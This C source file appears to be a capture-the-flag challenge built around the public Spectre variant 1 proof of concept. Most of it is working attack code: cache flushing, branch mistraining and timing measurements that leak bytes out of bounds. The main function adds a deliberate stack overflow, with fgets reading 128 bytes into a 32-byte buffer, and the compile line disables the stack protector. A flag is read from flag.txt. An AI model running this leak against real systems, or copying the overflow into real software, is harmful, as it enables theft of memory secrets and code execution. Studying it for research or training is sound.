/* Spectre PoC - https://spectreattack.com/spectre.pdf */

/* Compilation:
 * 
 * gcc -o spectre spectre.c -fno-stack-protector -no-pie -msse2
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#ifdef _MSC_VER
	#include <intrin.h>
	#pragma optimize("gt",on)
#else
	#include <x86intrin.h>
	#if defined(__SSE__) && !defined(__SSE2__)
		#define NOSSE2
	#endif
#endif

#ifdef NOSSE2
	#define NORDTSCP
	#define NOMFENCE
	#define NOCLFLUSH
#endif

#ifdef NOCLFLUSH
	#define STRIDE CACHE_FLUSH_STRIDE
	#define ITERATIONS CACHE_FLUSH_ITERATIONS
	#define CACHE_FLUSH_ITERATIONS 2048
	#define CACHE_FLUSH_STRIDE 4096
	uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
#endif

#define CACHE_HIT_THRESHOLD 80

unsigned int lenb = 16;
uint8_t unused1[64];
uint8_t b[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t a[256 * 512];
char flag[64];
int temp = 0;

#ifdef LINUX_KERNEL_MITIGATION
/* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */
static inline unsigned long array_index_mask_nospec(unsigned long index, unsigned long size){
	unsigned long mask;

	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
			:"=r" (mask)
			:"g"(size),"r" (index)
			:"cc");
	return mask;
}
#endif

void victim_function(size_t x){
	if (x < lenb) {
	#ifdef INTEL_MITIGATION
		/*
		 * According to Intel et al, the best way to mitigate this is to 
		 * add a serializing instruction after the boundary check to force
		 * the retirement of previous instructions before proceeding to 
		 * the read.
		 * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
		 */
		_mm_lfence();
	#endif
	#ifdef LINUX_KERNEL_MITIGATION
		x &= array_index_mask_nospec(x, lenb);
	#endif
		temp &= a[b[x] * 512];
	}
}

#ifdef NOCLFLUSH
void flush_memory_sse(uint8_t *addr){
	float *p = (float *)addr;
	float c = 0.f;

	__m128 i = _mm_setr_ps(c, c, c, c);

	int k, l;
	/* Non-sequential memory addressing by looping through k by l */
	for (k = 0; k < 4; k++)
		for (l = 0; l < 4; l++)
			_mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

#ifdef NOCLFLUSH
	int l, junk2 = 0;
#endif

	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (tries = 999; tries > 0; tries--){
	#ifndef NOCLFLUSH
		/* Flush a[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&a[i * 512]);
	#else
		/* Flush a[256*(0..255)] from cache 16 times with SSE */
		for (j = 0; j < 16; j++)
			for (i = 0; i < 256; i++)
				flush_memory_sse(&a[i * 512]);
	#endif

		/* 30 loops total:
		 * There are 5 training runs where x is equal to training_x
		 * for every attack x where x is equal to malicious_x.
		 */
		training_x = tries % lenb;

		for (j = 29; j >= 0; j--){
		#ifndef NOCLFLUSH
			_mm_clflush(&lenb);
		#else
			/* Alternative to using clflush to flush the CPU cache:
			 * read 4096-byte intervals 2000 times or more depending on
			 * CPU cache size.
             */
			for(l = ITERATIONS * STRIDE - 1; l >= 0; l -= STRIDE){
				junk2 = cache_flush_array[l];
			} 
		#endif

		/* Delay */
		#ifndef NOMFENCE
			for (i = 0; i < 100; i++) _mm_mfence();
		#else
			for (i = 0; i < 100; i++) {}
		#endif

			/* Set x to training_x if j%6 != 0 or malicious_x if j%6 == 0 */
			x = (((j % 6) - 1) & ~0xF) >> 0x4;
			x = training_x ^ (x & (malicious_x ^ training_x));

			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++){
			mix_i = ((i * 167) + 13) & 255;
			addr = &a[mix_i * 512];

		/* We need to accurately measure the memory access to the current
		 * index of the array so we can determine which index was cached
		 * by the malicious mispredicted code.
		 * 
		 * The best way to do this is to use the rdtscp instruction, which
		 * measures current processor ticks, and is also serialized.
		 *
		 * The process for determining which index cached the malicious
		 * mispredicted code will be as follows:
		 * 
		 * 1) Read timer to get initial time
		 * 2) Access memory
		 * 3) Read timer to get finish time
		 * 4) Compute elapsed time as finished - initial
		 */

		#ifndef NORDTSCP
			time1 = __rdtscp(&junk);
			junk = *addr;
			time2 = __rdtscp(&junk) - time1;
		#else

		/* The rdtscp instruction was introduced with the x86-64 extensions,
		 * so many older 32-bit processors won't support this.
		 *
		 * In that case, we need to use the equivalent but non-serialized
		 * tdtsc instruction instead.
		 */

			#ifndef NOMFENCE

		/* Since the rdstc instruction isn't serialized, newer processors will try to
		 * reorder it, ruining its value as a timing mechanism.
		 *
		 * To get around this, we use the mfence instruction to introduce a memory
		 * barrier and force serialization. mfence is used because it is portable across
		 * Intel and AMD.
		 */

				_mm_mfence();
				time1 = __rdtsc();
				_mm_mfence();
				junk = *addr;
				_mm_mfence();
				time2 = __rdtsc() - time1;
				_mm_mfence();

			#else

		/* The mfence instruction was introduced with the SSE2 instruction set,
		 * so we have to ifdef it out on pre-SSE2 processors.
		 *
		 * Luckily, these older processors don't seem to reorder the rdtsc instruction,
		 * so not having mfence on older processors is less of an issue.
		 */

				time1 = __rdtsc();
				junk = *addr;
				time2 = __rdtsc() - time1;

			#endif

		#endif

		/* If we get a cache hit, add +1 to score for this value */
		if ((int)time2 <= CACHE_HIT_THRESHOLD && mix_i != b[tries % lenb])
			results[mix_i]++;
		}

    	/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++){
			if (j < 0 || results[i] >= results[j]){
				k = j, j = i;
			} else if (k < 0 || results[i] >= results[k]){
				k = i;
			}
		}

		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best > 2*runner-up + 5 */
	}

	results[0] ^= junk;

	value[0] = (uint8_t) j;
	score[0] = results[j];
	value[1] = (uint8_t) k;
	score[1] = results[k];
}

void read_memory(size_t addr, int len){
	int score[2];
	uint8_t value[2];

	while (--len >= 0){
		readMemoryByte(addr++, value, score);
		putc((value[0] > 31 && value[0] < 127 ? value[0] : '?'), stdout);
	}
	putc('\n', stdout);
}

int get_input(void){
	char string[32];
	memset(string, 0, 32);
	fgets(string, 128, stdin);
}

void read_flag(void){
	FILE *fp = fopen("flag.txt", "r");
	fread(flag, 64, 1, fp);
	fclose(fp);
}

int main(int argc, const char **argv){
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);

	#ifdef NOCLFLUSH
		memset(cache_flush_array, 1, STRIDE * ITERATIONS);
	#endif

	/* Write to a so it gets put in RAM, not CoW zero pages */
	memset(a, 1, 256 * 512);

	get_input();

	return 0;
}
